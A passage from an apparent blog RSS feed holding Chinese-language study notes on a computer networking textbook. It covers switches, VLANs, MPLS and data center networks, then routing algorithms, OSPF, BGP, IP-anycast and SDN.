encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="mojikumi-line-end">。</span></li>
</ol>
<p>switch 是 <i>self-learning</i> 的<span class="mojikumi-line-end">：</span>如果在 interface <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></span> 收到 source MAC address 为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></span> 的 frame<span class="mojikumi-line-end">，</span>则会在 switch table 中记录 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></span> 到 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></span> 的对应关系<span class="mojikumi-line-end">。</span></p>
<p>相对于 hub<span class="mojikumi-line-end">，</span>switch 的优点有<span class="mojikumi-line-end">：</span></p>
<ul>
<li>没有 collision<span class="mojikumi-line-end">，</span>可以优化性能<span class="mojikumi-line-end">。</span></li>
<li>可以将不同 technology 的 link (media) 连接在一起<span class="mojikumi-line-end">。</span></li>
<li>switch 还提供了一些 network management 功能<span class="mojikumi-line-end">，</span>例如自动检测异常的 adapter 并禁用<span class="mojikumi-line-end">、</span>对流量进行统计<span class="mojikumi-line-end">。</span></li>
</ul>
<p>switch 减少了 broadcast<span class="mojikumi-line-end">，</span>在提升性能的同时也增强了安全性<span class="mojikumi-line-end">。</span>但是 attacker 可以设法用 bogus entries 将 switch table 填满<span class="mojikumi-line-end">，</span>使得大部分 frame 被 broadcast<span class="mojikumi-line-end">，</span>这被称作 <i>switch poisoning</i><span class="mojikumi-line-end">。</span></p>
<p>switch 和 router 都可以将多个 host 连接在一起<span class="mojikumi-line-end">：</span></p>
<ul>
<li>switch 不需要手动配置<span class="mojikumi-line-end">；</span>性能一般更好<span class="mojikumi-line-end">。</span>只能连成生成树<span class="mojikumi-line-end">，</span>不能连出环<span class="mojikumi-line-end">；</span>如果同一个 subnet 内有太多 host 可能影响性能<span class="mojikumi-line-end">；</span>可能遭受 broadcast storm<span class="mojikumi-line-end">。</span></li>
<li>router 需要手动配置<span class="mojikumi-line-end">；</span>性能可能略差<span class="mojikumi-line-end">。</span>可以随便连<span class="mojikumi-line-end">，</span>从而可以提供多条 route 供 routing protocol 选择<span class="mojikumi-line-end">；</span>提供 firewall 来防止遭受 broadcast storm<span class="mojikumi-line-end">。</span></li>
</ul>
<p>一般来说多至数百个 host 时用 switch 即可<span class="mojikumi-line-end">，</span>有更多 host 的话则需要适当使用 router 来进行中转<span class="mojikumi-line-end">。</span></p>
<h3 id="virtual-local-area-networks-vlans" class="heading"><a href="#virtual-local-area-networks-vlans" class="heading-anchor" aria-label="章节： Virtual Local Area Networks (VLANs)" tabindex="-1"></a><span>Virtual Local Area Networks (VLANs)</span></h3>
<p>有时<span class="mojikumi-line-end">，</span>物理上的 switch 会对网络管理造成一些限制<span class="mojikumi-line-end">：</span></p>
<ul>
<li>一个 switch 一般有很多 port<span class="mojikumi-line-end">，</span>但希望设置的 subnet 大小<span class="mojikumi-line-start">（</span>为了安全等原因想分成不同的 subnet<span class="mojikumi-line-end">）</span>可能和 port 数量不符<span class="mojikumi-line-end">。</span></li>
<li>如果要在不同 subnet 之间移动 host<span class="mojikumi-line-end">，</span>需要更改物理连线<span class="mojikumi-line-end">。</span></li>
</ul>
<p>VLAN 可以用来解决这些问题<span class="mojikumi-line-end">。</span></p>
<p>VLAN 通过软件控制一个 switch 上哪些 port 属于同一个 subnet<span class="mojikumi-line-end">。</span>为了将两个 subnet 相连<span class="mojikumi-line-end">，</span>需要将它们连到同一个 router 上<span class="mojikumi-line-end">，</span>为了方便这样操作<span class="mojikumi-line-end">，</span>支持 VLAN 的 switch 往往自带一个 router<span class="mojikumi-line-end">。</span></p>
<p>可以使用 VLAN trunking 来将多个 switch 上的 port 合并为一个 VLAN<span class="mojikumi-line-end">：</span>每个 switch 上有一个 trunk port<span class="mojikumi-line-end">，</span>将需要 trunking 的 switch 的 trunk port 相连<span class="mojikumi-line-end">，</span>发送到 VLAN 的 frame 会被 forward 到 trunk port<span class="mojikumi-line-end">。</span>trunking 时所属 VLAN 的识别通过扩展的 Ethernet frame format 802.1Q 来实现<span class="mojikumi-line-end">，</span>在 header 中添加 VLAN tag 来表示所属的 VLAN<span class="mojikumi-line-end">。</span></p>
<p>除了基于 switch port 的 VLAN<span class="mojikumi-line-end">，</span>还有基于 MAC address 的 VLAN<span class="mojikumi-line-end">，</span>以及基于 network-layer protocol 的 VLAN<span class="mojikumi-line-end">。</span></p>
<h2 id="multiprotocol-label-switching-mpls" class="heading"><a href="#multiprotocol-label-switching-mpls" class="heading-anchor" aria-label="章节： Multiprotocol Label Switching (MPLS)" tabindex="-1"></a><span>Multiprotocol Label Switching (MPLS)</span></h2>
<p>MPLS 基于 fixed-length label 进行 switch<span class="mojikumi-line-end">，</span>在 link-layer header 和 IP header 之间添加 MPLS header<span class="mojikumi-line-end">，</span>需要在支持 MPLS 的 router 之间进行传输<span class="mojikumi-line-end">，</span>switch 时不需要管 IP header<span class="mojikumi-line-end">。</span></p>
<p>MPLS 有 switch 速度快<span class="mojikumi-line-end">、</span>便于进行 traffic management 等优点<span class="mojikumi-line-end">。</span></p>
<p><span class="mojikumi-line-start">（</span>书中对它的介绍过于简略<span class="mojikumi-line-end">，</span>感觉说了和没说差不多<span class="mojikumi-line-end">，</span>我就在此基础上再简略一点（<span class="mojikumi">（</span></p>
<h2 id="data-center-networking" class="heading"><a href="#data-center-networking" class="heading-anchor" aria-label="章节： Data Center Networking" tabindex="-1"></a><span>Data Center Networking</span></h2>
<p>很多大型互联网公司都有由数万台 server 组成的 data center<span class="mojikumi-line-end">。</span>data center 对外接入 Internet<span class="mojikumi-line-end">，</span>而其内部又有一套 data center network<span class="mojikumi-line-end">。</span></p>
<p>data center 主要提供三部分的功能<span class="mojikumi-line-end">：</span>向终端用户 serve content<span class="mojikumi-line-end">，</span>进行 distributed computation<span class="mojikumi-line-end">，</span>对外提供 cloud computing 服务<span class="mojikumi-line-end">。</span></p>
<p>data center 中的 host 被称作 <i>blade</i><span class="mojikumi-line-end">，</span>一般数十个 blade 会放在一起组成一个 <i>rack</i><span class="mojikumi-line-end">，</span>连到同一个 switch<span class="mojikumi-line-start">（</span>top of rack, TOR switch<span class="mojikumi-line-end">）</span>上<span class="mojikumi-line-end">，</span>而整个 data center 通过多级 router 和 switch 构成一个 hierarchy<span class="mojikumi-line-end">，</span>其中 access router 的下方可以分为多个 VLAN<span class="mojikumi-line-end">。</span>如下图所示<span class="mojikumi-line-end">：</span><sup><a href="#user-content-fn-fig-6.30" id="user-content-fnref-fig-6.30" data-footnote-ref aria-describedby="footnote-label">2</a></sup></p>
<p><picture><source type="image/webp" srcset="/assets/cnatda-fig-6.30.2bc76e92.webp"><img srcset="/assets/cnatda-fig-6.30.93c4cef6.png" loading="lazy" src="/assets/cnatda-fig-6.30.93c4cef6.png" width="1643" height="996" alt="A data center network with a hierarchical topology"></picture></p>
<p>在 data center 中<span class="mojikumi-line-end">，</span>一个 application 通常由很多 host 来提供同样的服务<span class="mojikumi-line-end">，</span>而对外只提供一个 IP address<span class="mojikumi-line-end">。</span>load balancer 通过类似 NAT 的方式<span class="mojikumi-line-end">，</span>将 request 均衡地分配给各个 host 进行处理<span class="mojikumi-line-end">。</span></p>
<p>树状的网络结构使得一个 data center 可以有数万台 server<span class="mojikumi-line-end">，</span>但 host-to-host capacity 还是会受限<span class="mojikumi-line-end">，</span>尤其是两个 host 的 LCA 位于较高层级时<span class="mojikumi-line-end">。</span>为了解决这一问题<span class="mojikumi-line-end">，</span>可以<span class="mojikumi-line-end">：</span></p>
<ul>
<li>使用更高速的 router 和 switch<span class="mojikumi-line-end">，</span>但这会大大增加开销<span class="mojikumi-line-end">。</span></li>
<li>尽量将需要互相通信的 host 放在较低的同一棵子树内<span class="mojikumi-line-end">，</span>但这不一定做得到<span class="mojikumi-line-start">（</span>可能大量 host 都需要互相通信<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>也会影响 host 位置的灵活性<span class="mojikumi-line-end">。</span></li>
<li>增加 interconnection 的数量<span class="mojikumi-line-end">，</span>从而增加 host-to-host 的路径数量<span class="mojikumi-line-end">，</span>在优化性能的同时也可以提升系统的可靠性<span class="mojikumi-line-end">。</span>例如<span class="mojikumi-line-end">，</span>每个 TOR switch 连接到 8 个 tier-2 switch<span class="mojikumi-line-end">，</span>每个 tier-2 switch 连接到 16 个 tier-1 switch…… 这也被称作 <i>Clos network</i><span class="mojikumi-line-end">。</span></li>
</ul>
<p>data center 通常使用 SDN 来对网络进行集中管理<span class="mojikumi-line-end">。</span></p>
<p>为了支持 cloud computing<span class="mojikumi-line-end">、</span>更方便地进行管理<span class="mojikumi-line-end">，</span>通常会使用 virtual machine (VM) 等技术将 software 和 hardware 解耦<span class="mojikumi-line-end">。</span>为了让 VM 能方便地在不同 host 之间移动<span class="mojikumi-line-end">，</span>可以将 ARP 的 broadcast 机制改为类似于 DNS 的机制<span class="mojikumi-line-end">，</span>存储 VM 的 IP address 到 TOR switch 的映射关系<span class="mojikumi-line-end">。</span></p>
<p>data center network 通常具有极低的延迟以及较小的 buffer size<span class="mojikumi-line-end">，</span>而 congestion control 需要快速作出反应<span class="mojikumi-line-end">，</span>传统的 TCP 不再适用<span class="mojikumi-line-end">，</span>通常会使用为 data center 设计的 TCP 等方式来进行优化<span class="mojikumi-line-end">。</span></p>
<p>modular data center (MDC) 是一个内有至多数千个 host 的 container<span class="mojikumi-line-end">，</span>用来作为 data center 的组成部分<span class="mojikumi-line-end">。</span>在 MDC 的部分 component 坏掉时<span class="mojikumi-line-end">，</span>MDC 可以继续以 degraded performance 工作<span class="mojikumi-line-end">，</span>而在坏掉的 component 过多时则会报废<span class="mojikumi-line-end">。</span></p>
<p>很多公司会自己定制 data center 中的各个组成部分<span class="mojikumi-line-end">，</span>包括 network adapter<span class="mojikumi-line-end">、</span>switch<span class="mojikumi-line-end">、</span>router<span class="mojikumi-line-end">、</span>software<span class="mojikumi-line-end">、</span>networking protocol<span class="mojikumi-line-end">。</span></p>
<p>Amazon 通过 <span class="mojikumi">“</span>availability zone<span class="mojikumi">”</span> 提高了服务的可靠性<span class="mojikumi-line-end">，</span>即将 data center 在邻近但不同的地理位置上进行复刻<span class="mojikumi-line-end">，</span>从而提供 fault tolerance<span class="mojikumi-line-end">，</span>而地理位置上的邻近保证了 low latency<span class="mojikumi-line-end">，</span>便于同步<span class="mojikumi-line-end">。</span></p>
<section data-footnotes class="footnotes"><h2 class="sr-only" id="footnote-label">Footnotes</h2>
<ol>
<li id="user-content-fn-arp-response-broadcast">
<p><a href="https://networkengineering.stackexchange.com/questions/7136/arp-replies-can-they-be-broadcast">ethernet - ARP Replies can they be Broadcast - Network Engineering Stack Exchange</a> <a href="#user-content-fnref-arp-response-broadcast" data-footnote-backref class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-fig-6.30">
<p>p506, Figure 6.30: A data center network with a hierarchical topology <a href="#user-content-fnref-fig-6.30" data-footnote-backref class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category domain="https://ouuan.moe/tag/cnatda">cnatda</category>
            <category domain="https://ouuan.moe/tag/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">学习笔记</category>
        </item>
        <item>
            <title><![CDATA[CNATDA 第五章学习笔记]]></title>
            <link>https://ouuan.moe/post/2023/07/cnatda-5</link>
            <guid>https://ouuan.moe/post/2023/07/cnatda-5</guid>
            <pubDate>Sat, 08 Jul 2023 12:37:49 GMT</pubDate>
            <description><![CDATA[
<p><span class="mojikumi-line-start">《</span>Computer Networking: A Top-Down Approach (8th Edition)<span class="mojikumi-line-end">》</span>第五章 <span class="mojikumi">“</span>The Network Layer: Control Plane<span class="mojikumi">”</span> 的学习笔记<span class="mojikumi-line-end">。</span></p>
]]></description>
            <content:encoded><![CDATA[
<p><span class="mojikumi-line-start">《</span>Computer Networking: A Top-Down Approach (8th Edition)<span class="mojikumi-line-end">》</span>第五章 <span class="mojikumi">“</span>The Network Layer: Control Plane<span class="mojikumi">”</span> 的学习笔记<span class="mojikumi-line-end">。</span></p>

<h2 id="introduction" class="heading"><a href="#introduction" class="heading-anchor" aria-label="章节： Introduction" tabindex="-1"></a><span>Introduction</span></h2>
<p>control plane 需要计算出 forwarding table / flow table<span class="mojikumi-line-end">，</span>有两种方式<span class="mojikumi-line-end">：</span></p>
<ul>
<li>per-router control: router 之间互相发送信息<span class="mojikumi-line-end">，</span>分别进行计算</li>
<li>logicially centralized control: 使用 remote controller 集中地获取信息<span class="mojikumi-line-end">、</span>计算<span class="mojikumi-line-end">、</span>分发结果</li>
</ul>
<h2 id="routing-algorithms" class="heading"><a href="#routing-algorithms" class="heading-anchor" aria-label="章节： Routing Algorithms" tabindex="-1"></a><span>Routing Algorithms</span></h2>
<p>在 routing algorithm 中<span class="mojikumi-line-end">，</span>网络被抽象为一张图<span class="mojikumi-line-end">，</span>考虑 physical length<span class="mojikumi-line-end">、</span>link speed<span class="mojikumi-line-end">、</span>monetary cost 等因素作为边权<span class="mojikumi-line-end">。</span></p>
<p>routing algorithm 可以分为<span class="mojikumi-line-end">：</span></p>
<ul>
<li>centralized / decentralized<span class="mojikumi-line-end">：</span>计算过程中是否知道整个图的信息</li>
<li>static / dynamic<span class="mojikumi-line-end">：</span>是否对网络负载<span class="mojikumi-line-end">、</span>拓扑结构等的改变即时做出响应</li>
<li>load-sensitive/insensitive: 是否考虑 congestion 状况</li>
</ul>
<h3 id="the-link-state-ls-routing-algorithm" class="heading"><a href="#the-link-state-ls-routing-algorithm" class="heading-anchor" aria-label="章节： The Link-State (LS) Routing Algorithm" tabindex="-1"></a><span>The Link-State (LS) Routing Algorithm</span></h3>
<p>LS 是一个 centralized routing algorithm<span class="mojikumi-line-end">，</span>需要每个 node 将其 attached links 的信息进行广播<span class="mojikumi-line-start">（</span>link-state broadcast<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>使得每个 node 都有整张图的信息<span class="mojikumi-line-end">，</span>再用 Dijkstra 等算法计算最短路<span class="mojikumi-line-end">。</span></p>
<p>在 load-sensitive routing algorithm 中<span class="mojikumi-line-end">，</span>traffic load 的改变可能导致 oscillation<span class="mojikumi-line-end">，</span>要么改为 load-insensitive<span class="mojikumi-line-end">，</span>要么设法保证各个 router 不同时运行 routing algorithm<span class="mojikumi-line-end">。</span></p>
<h3 id="the-distance-vector-dv-routing-algorithm" class="heading"><a href="#the-distance-vector-dv-routing-algorithm" class="heading-anchor" aria-label="章节： The Distance-Vector (DV) Routing Algorithm" tabindex="-1"></a><span>The Distance-Vector (DV) Routing Algorithm</span></h3>
<p>每个 node 维护一个到其他每个 node 的 distance vector<span class="mojikumi-line-end">，</span>告诉 neighbor 自己的 distance vector<span class="mojikumi-line-end">，</span>通过 neighbor 的 distance vector 更新自己的 distance vector<span class="mojikumi-line-end">。</span>link state 发生改变时<span class="mojikumi-line-end">，</span>会经过多轮迭代进行传播并最终收敛<span class="mojikumi-line-end">。</span></p>
<p>在 link cost 减小时<span class="mojikumi-line-end">，</span>收敛是较快的<span class="mojikumi-line-end">。</span></p>
<p>但是在 link cost 增大时<span class="mojikumi-line-end">，</span>收敛可能需要边权值域大小轮次的迭代<span class="mojikumi-line-start">（</span>称作 <i>count-to-infinity problem</i><span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>并在过程中产生 routing loop<span class="mojikumi-line-end">，</span>例如下图所示的情况<span class="mojikumi-line-end">：</span><sup><a href="#user-content-fn-fig-5.7-b" id="user-content-fnref-fig-5.7-b" data-footnote-ref aria-describedby="footnote-label">1</a></sup></p>
<p><picture><source type="image/webp" srcset="/assets/cnatda-fig-5.7-b.4a53bb07.webp"><img srcset="/assets/cnatda-fig-5.7-b.f5520e4f.png" loading="lazy" src="/assets/cnatda-fig-5.7-b.f5520e4f.png" width="371" height="207" alt="Changes in link cost"></picture></p>
<p>使用 <i>poisoned reverse</i> 可以避免出现二元环<span class="mojikumi-line-end">：</span>如果 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span></span> 使用了 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(u, v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span></span> 这条边来走向 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="mojikumi-line-end">，</span>则在 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span></span> 告诉 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span> 的 distance vector 中<span class="mojikumi-line-end">，</span><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span></span> 到 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span></span> 的距离是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∞</mi></mrow><annotation encoding="application/x-tex">\infty</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord">∞</span></span></span></span></span><span class="mojikumi-line-end">。</span></p>
<p>但是 poisoned reverse 不能避免多元环的出现<span class="mojikumi-line-end">。</span></p>
<h3 id="comparison-of-ls-and-dv-routing-algorithms" class="heading"><a href="#comparison-of-ls-and-dv-routing-algorithms" class="heading-anchor" aria-label="章节： Comparison of LS and DV Routing Algorithms" tabindex="-1"></a><span>Comparison of LS and DV Routing Algorithms</span></h3>
<ul>
<li>message complexity: LS 需要让每个 node 都获取到全局的 link state<span class="mojikumi-line-end">，</span>要传送大量信息<span class="mojikumi-line-end">，</span>且信息需要发送到很远的地方<span class="mojikumi-line-end">；</span>DV 只需要从 neighbor 获取信息<span class="mojikumi-line-end">。</span></li>
<li>speed of convergence: LS 有 Dijkstra 的低复杂度<span class="mojikumi-line-end">，</span>DV 则较慢<span class="mojikumi-line-end">，</span>而且过程中可能出现 routing loop<span class="mojikumi-line-end">，</span>还有 count-to-infinity problem<span class="mojikumi-line-end">。</span></li>
<li>robustness: 在 LS 中<span class="mojikumi-line-end">，</span>每个 node 可以提供错误的 link state<span class="mojikumi-line-end">，</span>但影响有限<span class="mojikumi-line-end">，</span>每个 node 只为自己计算 forwarding table<span class="mojikumi-line-end">；</span>在 DV 中<span class="mojikumi-line-end">，</span>每个 node 的计算结果都是其他 node 的计算的一部分<span class="mojikumi-line-end">，</span>影响可以很大<span class="mojikumi-line-end">。</span></li>
</ul>
<p>实际上<span class="mojikumi-line-end">，</span>Internet 同时使用了这两种算法<span class="mojikumi-line-end">。</span></p>
<h2 id="intra-as-routing-in-the-internet-ospf" class="heading"><a href="#intra-as-routing-in-the-internet-ospf" class="heading-anchor" aria-label="章节： Intra-AS Routing in the Internet: OSPF" tabindex="-1"></a><span>Intra-AS Routing in the Internet: OSPF</span></h2>
<p>如果统一管理所有 router<span class="mojikumi-line-end">，</span>一方面规模过大性能无法接受<span class="mojikumi-line-end">，</span>另一方面无法满足自治的需求<span class="mojikumi-line-end">。</span>所以<span class="mojikumi-line-end">，</span>实际上 router 被分成了很多个 autonomous system (AS)<span class="mojikumi-line-end">，</span>每个 AS 有一个 ICANN 赋予的编号<span class="mojikumi-line-end">。</span>例如<span class="mojikumi-line-end">，</span>每个 ISP 可能管理着一个或多个 AS<span class="mojikumi-line-end">。</span></p>
<p>每个 AS 内使用同一个 intra-AS routing protocol<span class="mojikumi-line-end">，</span>例如 OSPF (Open Shortest Path First) <span class="mojikumi-line-end">，</span>它非常复杂<span class="mojikumi-line-end">，</span>书中只有简要介绍<span class="mojikumi-line-end">。</span></p>
<p>OSPF 使用的是 LS routing algorithm<span class="mojikumi-line-end">，</span>边权由管理员设置<span class="mojikumi-line-end">，</span>每个 router 都会向整个 AS 内的其他所有 router<span class="mojikumi-line-start">（</span>在 link state 发生变化时 &#x26; 周期性地<span class="mojikumi-line-end">）</span>broadcast link state<span class="mojikumi-line-end">。</span></p>
<ul>
<li>OSPF message 直接通过 IP 传输<span class="mojikumi-line-end">，</span>不使用 transport-layer protocol<span class="mojikumi-line-end">。</span></li>
<li>支持 authentication<span class="mojikumi-line-end">。</span></li>
<li>有多条最短路时<span class="mojikumi-line-end">，</span>可以同时使用<span class="mojikumi-line-end">。</span></li>
<li>有 MOSPF 扩展来支持 multicast<span class="mojikumi-line-end">。</span></li>
<li>可以将 AS 划分为多个 area 形成 AS 内部的 hierarchy<span class="mojikumi-line-end">，</span>每个 area 内部走最短路<span class="mojikumi-line-end">，</span>不同 area 之间通过每个 area 的 border router 走 backbone area<span class="mojikumi-line-end">。</span></li>
</ul>
<h2 id="routing-among-the-isps-bgp" class="heading"><a href="#routing-among-the-isps-bgp" class="heading-anchor" aria-label="章节： Routing Among the ISPs: BGP" tabindex="-1"></a><span>Routing Among the ISPs: BGP</span></h2>
<h3 id="the-role-of-bgp" class="heading"><a href="#the-role-of-bgp" class="heading-anchor" aria-label="章节： The Role of BGP" tabindex="-1"></a><span>The Role of BGP</span></h3>
<p>BGP (Border Gateway Protocol) 是所有 AS 共用的 inter-AS routing protocol<span class="mojikumi-line-end">，</span>将各个 AS 连接在一起<span class="mojikumi-line-end">。</span></p>
<p>在 BGP 中<span class="mojikumi-line-end">，</span>destination 不是特定的 IP address<span class="mojikumi-line-end">，</span>而是 CIDR prefix<span class="mojikumi-line-end">。</span>BGP 使得一个 AS 可以向其他 AS advertise prefix<span class="mojikumi-line-end">，</span>并计算出到达各个 prefix 的 route<span class="mojikumi-line-end">。</span></p>
<h3 id="advertising-bgp-route-information" class="heading"><a href="#advertising-bgp-route-information" class="heading-anchor" aria-label="章节： Advertising BGP Route Information" tabindex="-1"></a><span>Advertising BGP Route Information</span></h3>
<p>不同 router 之间会建立称作 BGP connection 的 TCP connection<span class="mojikumi-line-start">（</span>不是 physical link<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>一般来说负责连接两个 AS 的 gateway router 之间会建立 external BGP (eBGP) connection<span class="mojikumi-line-end">；</span>而 AS 内部的 router 两两之间建立 internal BGP (iBGP) connection<span class="mojikumi-line-end">。</span></p>
<p>一条 BGP advertisement<span class="mojikumi-line-start">（</span>称作一个 <i>route</i><span class="mojikumi-line-end">）</span>包含 AS-PATH 和 NEXT-HOP 等信息<span class="mojikumi-line-end">：</span></p>
<ul>
<li>AS-PATH 即经过哪几个 AS 能到达目的地<span class="mojikumi-line-end">，</span>一个 AS 收到来自其他 AS 的 route 后<span class="mojikumi-line-end">，</span>可以在 AS-PATH 中加上自己<span class="mojikumi-line-end">，</span>继续向 neighbor 发送<span class="mojikumi-line-end">；</span></li>
<li>NEXT-HOP 是从当前 AS 出发向目的地走<span class="mojikumi-line-end">，</span>走出当前 AS 遇到的第一个 router 的 IP address<span class="mojikumi-line-end">。</span></li>
</ul>
<h3 id="determining-the-best-routes" class="heading"><a href="#determining-the-best-routes" class="heading-anchor" aria-label="章节： Determining the Best Routes" tabindex="-1"></a><span>Determining the Best Routes</span></h3>
<p>从一个 AS 出发到达某个 prefix 可能有很多条路径<span class="mojikumi-line-end">，</span>BGP 按照下面的顺序来决定 best route<span class="mojikumi-line-start">（</span>平局则使用下一条规则<span class="mojikumi">）</span><span class="mojikumi-line-end">：</span></p>
<ol>
<li>由管理员设置或从其他 AS 获取的 local preference</li>
<li>shortest AS-PATH<span class="mojikumi-line-start">（</span>经过最少个 AS<span class="mojikumi-line-end">）</span></li>
<li>在 AS 内走最短路<span class="mojikumi-line-start">（</span>通过 intra-AS protocol 以及 NEXT-HOP 得到<span class="mojikumi-line-end">）</span>到达 gateway router</li>
<li>根据 BGP identifier 选</li>
</ol>
<h3 id="ip-anycast" class="heading"><a href="#ip-anycast" class="heading-anchor" aria-label="章节： IP-anycast" tabindex="-1"></a><span>IP-anycast</span></h3>
<p>BGP 可以计算出到达某个 prefix (IP address) 的 best route<span class="mojikumi-line-end">，</span>如果为多个 host 设置相同的 IP address<span class="mojikumi-line-end">，</span>则可以实现 IP-anycast<span class="mojikumi-line-end">，</span>例如在 CDN 中可以让用户从多个内容相同的 server 中挑选最适合的一个<span class="mojikumi-line-end">，</span>而这一挑选是在 router 处通过 BGP 实现的<span class="mojikumi-line-end">。</span></p>
<p>但是 IP-anycast 如果用于 TCP 可能导致同一个 TCP connection 发给不同 host<span class="mojikumi-line-end">，</span>所以 CDN 一般不采用 IP-anycast<span class="mojikumi-line-end">，</span>而 DNS root server 则采用了 IP-anycast<span class="mojikumi-line-start">（</span>DNS 使用 UDP<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<h3 id="routing-policy" class="heading"><a href="#routing-policy" class="heading-anchor" aria-label="章节： Routing Policy" tabindex="-1"></a><span>Routing Policy</span></h3>
<p>BGP 通过 local preference 给管理员提供了决定如何选择 route 的自由<span class="mojikumi-line-end">，</span>以实现某些 policy<span class="mojikumi-line-end">。</span></p>
<p>例如<span class="mojikumi-line-end">，</span>当一个 access ISP 连接到多个 backbone ISP<span class="mojikumi-line-start">（</span>即 multi-home<span class="mojikumi-line-end">）</span>时<span class="mojikumi-line-end">，</span>access ISP 不应该作为中介在不同 backbone ISP 之间进行传输<span class="mojikumi-line-end">。</span>一般来说<span class="mojikumi-line-end">，</span>一个 ISP 只会在通信双方至少有一方是其 customer 时提供服务<span class="mojikumi-line-end">。</span></p>
<h2 id="the-sdn-control-plane" class="heading"><a href="#the-sdn-control-plane" class="heading-anchor" aria-label="章节： The SDN Control Plane" tabindex="-1"></a><span>The SDN Control Plane</span></h2>
<p>SDN 分为 SDN controller<span class="mojikumi-line-end">、</span>network management applications<span class="mojikumi-line-start">（</span>例如 routing<span class="mojikumi-line-end">、</span>access control<span class="mojikumi-line-end">、</span>load balancing<span class="mojikumi">）</span><span class="mojikumi-line-end">、</span>controlled devices 三个部分<span class="mojikumi-line-end">。</span>其中 SDN controller 连接了 network management applications 和 controlled devices<span class="mojikumi-line-end">。</span></p>
<p>SDN 使用 generalized forwarding<span class="mojikumi-line-end">，</span>将 data plane 和 control plane 分开<span class="mojikumi-line-end">，</span>通过 network management applications 提供 network control functions<span class="mojikumi-line-end">，</span>实现了 programmable network<span class="mojikumi-line-end">。</span></p>
